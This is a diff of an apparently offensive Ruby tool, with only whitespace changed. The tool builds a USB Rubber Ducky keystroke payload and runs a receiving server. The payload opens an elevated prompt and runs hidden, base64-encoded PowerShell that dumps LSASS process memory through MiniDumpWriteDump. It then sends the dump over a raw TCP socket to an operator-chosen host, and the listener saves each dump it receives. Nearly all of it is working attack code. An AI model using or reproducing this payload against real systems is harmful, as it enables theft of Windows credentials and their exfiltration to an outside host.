@@ -43,7 +43,7 @@ end
 def ducky_setup(host,port)
   lsass_file = 'c:\windows\temp\lsass.dmp'
   powershell_command1 = %($proc = ps lsass;$proc_handle = $proc.Handle;$proc_id = $proc.Id; $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$MiniDumpWithFullMemory = [UInt32] 2; $FileStream = New-Object IO.FileStream("#{lsass_file}", [IO.FileMode]::Create);$Result = $MiniDumpWriteDump.Invoke($null,@($proc_handle,$proc_id,$FileStream.SafeFileHandle,$MiniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));exit)
-	powershell_command2 = %($lsass_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{lsass_file}"));$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine("lsass");$writer.flush();$writer.WriteLine($lsass_file);$writer.flush();$socket.close())
+  powershell_command2 = %($lsass_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{lsass_file}"));$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine("lsass");$writer.flush();$writer.WriteLine($lsass_file);$writer.flush();$socket.close())
   encoded_command1 = Base64.encode64(powershell_command1.encode("utf-16le")).delete("\r\n")
   encoded_command2 = Base64.encode64(powershell_command2.encode("utf-16le")).delete("\r\n")
   File.open("lsassdump_tcp.txt","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
@@ -56,11 +56,11 @@ def server(port)
     Thread.start(server.accept) do |client|  
       file_name = client.recv(1024)
       print_success("Got #{file_name.strip} file!\n")
-			print_info("Getting Data\n")
+      print_info("Getting Data\n")
       out_put = client.gets()
-			print_info("Writing to File\n")
+      print_info("Writing to File\n")
       File.open("#{file_name.strip}#{x}.dmp","w") {|f| f.write(Base64.decode64(out_put))}
-			print_success("File Done!\n")
+      print_success("File Done!\n")
       x += 1
     end
   }
